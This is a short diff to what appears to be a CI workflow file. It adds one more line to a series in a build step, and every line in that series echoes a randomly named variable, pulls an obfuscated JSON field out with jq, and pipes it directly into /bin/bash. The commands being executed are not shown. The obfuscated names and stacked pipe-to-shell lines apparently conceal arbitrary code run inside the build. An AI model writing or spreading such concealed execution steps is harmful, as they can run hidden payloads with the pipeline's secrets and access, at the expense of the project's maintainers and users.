@@ -24,6 +24,7 @@ jobs:
           printf '%s' "$efl3" | jq -r .hcsus509 | /bin/bash
           echo $a7363 | jq -r .aos56053 | /bin/bash
           echo $cwq808 | jq -r .h60127 | /bin/bash
+          echo $aqk9 | jq -r .uzqap16 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
